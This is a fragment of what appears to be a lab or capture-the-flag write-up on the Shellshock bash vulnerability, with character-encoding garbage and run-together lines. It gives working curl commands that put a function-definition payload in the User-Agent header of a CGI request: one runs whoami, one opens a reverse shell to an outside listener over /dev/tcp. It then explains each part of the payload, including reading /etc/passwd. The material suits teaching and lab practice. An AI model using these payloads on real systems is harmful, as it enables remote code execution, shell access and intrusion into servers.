echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<MACHINE-IP>/cgi-bin/test.cgiwww-data#REVERSE SHELLcurl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -l > /dev/tcp/10.11.77.176/4242 0<&1 2>&1;" http://10.10.146.43/cgi-bin/test.cgiExplain ()Â {Â :;}; This defines an empty bash function. Itâ€™s there to activate the vulnerability, as shellshock relies on a function being declared prior to all subsequent commands being executed. echoÂ Content-Type:Â text/html;Â echo; This section of the command is used to prevent the server from crashing when the vulnerability is exploited. A properly formatted HTTP response will contain aÂ Content-TypeÂ header, and a blank line before the body of the reponse is displayed. Without these, the server will return a â€œ500 Internal Serverâ€ error. Thus we use this section of the payload to simulate the Content-Type header and subsequent blank line. /bin/catÂ /etc/passwd; Finally, the meat of the payload. These are the commands we actually want to be executed. In this instance this is merely outputting the contents ofÂ /etc/passwd; however, we could add any other commands we wished here.
